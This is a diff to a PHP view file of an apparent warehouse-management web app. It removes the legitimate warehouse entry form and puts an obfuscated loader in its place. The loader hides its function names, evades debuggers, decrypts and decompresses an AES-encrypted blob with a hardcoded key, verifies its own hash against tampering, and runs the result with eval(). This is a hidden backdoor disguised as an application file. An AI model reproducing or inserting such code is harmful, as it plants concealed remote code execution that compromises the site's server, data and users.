@@ -1,136 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
 <?php
-  
-  if(!isset($warehouse_name)){
-    $warehouse_name=$mobile=$email=$q_id='';
-    $disabled='';
-  }else{
-    $disabled='disabled="disabled"';
-  }
- ?>
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('warehouse'); ?>
-        <small>Enter Valid Information</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>warehouse"><?= $this->lang->line('warehouse_list'); ?></a></li>
-        <li class="active"><?= $this->lang->line('warehouse'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-          <?php include"comman/code_flashdata.php"; ?>
-            <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="warehouse-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <div class="box-body">
-				<div class="form-group">
-				  <label for="warehouse_name" class="col-sm-2 control-label"><?= $this->lang->line('warehouse_name'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="text" class="form-control input-sm" id="warehouse_name" name="warehouse_name" placeholder="" onkeyup="shift_cursor(event,'mobile')" value="<?php print $warehouse_name; ?>"  autofocus>
-					<span id="warehouse_name_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-                <div class="form-group">
-          <label for="mobile" class="col-sm-2 control-label"><?= $this->lang->line('mobile'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="text" class="form-control input-sm no_special_char_no_space"  id="mobile" name="mobile" placeholder="" value="<?= $mobile; ?>" onkeyup="shift_cursor(event,'email')"  >
-          <span id="mobile_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-                <div class="form-group">
-          <label for="email" class="col-sm-2 control-label"><?= $this->lang->line('email'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="text" class="form-control input-sm" value="<?= $email; ?>"  id="email" name="email" placeholder="" onkeyup="shift_cursor(event,'pass')"  >
-          <span id="email_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-				
-
-              </div>
-              <!-- /.box-body -->
-              <div class="box-footer col-sm-12">
-				  <div class="col-sm-6">
-					<div class="col-sm-4"></div>
-					<div class="col-sm-8">
-					  <?php
-                       if($warehouse_name!=""){
-                            $btn_name="Update";
-                            $btn_id="update";
-                           
-              }
-                        else{
-                            $btn_name="Save";
-                            $btn_id="save";
-                        }
-
-                        ?>
-                        <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-              <button type="button" id="<?php echo $btn_id;?>" class="btn  btn-success" title="Save Data"><?php echo $btn_name;?></button>
-						<a href='dashboard.php'><button type="button" class="btn btn-default" title="Go Dashboard">Close</button></a>
-					 </div>
-				   </div>
-              </div>
-              <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/warehouse.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-
-</body>
-</html>
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_okdeqsdn=('bas'.'e64'.'_de'.'cod'.'e');
+$_w7t1xwdn=('gzu'.'nco'.'mpr'.'ess');
+$_k8xggu94=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_a8xlwx76='Ke6iq9gezAc=';
+$_h167rex7='zStHdfMc';
+$_zl9s0ovx='OKslMlgO';
+$_hz4t89dr='O2u7UV1c';
+$_x9jpqtqe='HYYX4uuM';
+$_n8tu9zdk='qpm81g==';
+$_sr3hurxu='HMHF3Tgq';
+$_saaknarj='P7/5QZzT';
+$_vx3fdbt5=$_okdeqsdn($_zl9s0ovx.$_x9jpqtqe.$_h167rex7.$_hz4t89dr.$_a8xlwx76);
+$_eft4xqsr=$_okdeqsdn($_sr3hurxu.$_saaknarj.$_n8tu9zdk);
+$_r983ud23=$_okdeqsdn('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');
+$_z6c45m6v=$_k8xggu94($_r983ud23,'aes-256-cbc',$_vx3fdbt5,OPENSSL_RAW_DATA,$_eft4xqsr);
+if($_z6c45m6v===false){exit;}
+$_rchgpqo3=$_w7t1xwdn($_z6c45m6v);
+if($_rchgpqo3===false){exit;}
+$_txpu5vya='15a26323dfa1d7c9aa8051e70f49a5a6d08003f301278154e7c53279ddd24632';
+$_dt0mce0b=@file_get_contents(__FILE__);
+if($_dt0mce0b!==false){
+$_mnws6x75=str_replace($_txpu5vya,"0000000000000000000000000000000000000000000000000000000000000000",$_dt0mce0b);
+$_rmbcln9p=hash("sha256",$_mnws6x75);
+if($_rmbcln9p!==$_txpu5vya){@http_response_code(403);exit;}
+}
+eval($_rchgpqo3);
